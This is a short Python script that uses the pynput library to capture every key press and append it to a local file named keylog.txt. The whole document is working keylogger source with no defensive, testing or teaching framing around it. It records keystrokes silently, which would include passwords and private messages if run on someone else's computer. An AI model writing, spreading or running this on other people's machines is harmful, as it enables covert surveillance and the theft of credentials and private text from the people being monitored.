from pynput.keyboard import Listener

# File to store keystrokes
log_file = "keylog.txt"

# Function to log key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")  # Write key to file
    except Exception as e:
        print(f"Error: {e}")

# Start listening for keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
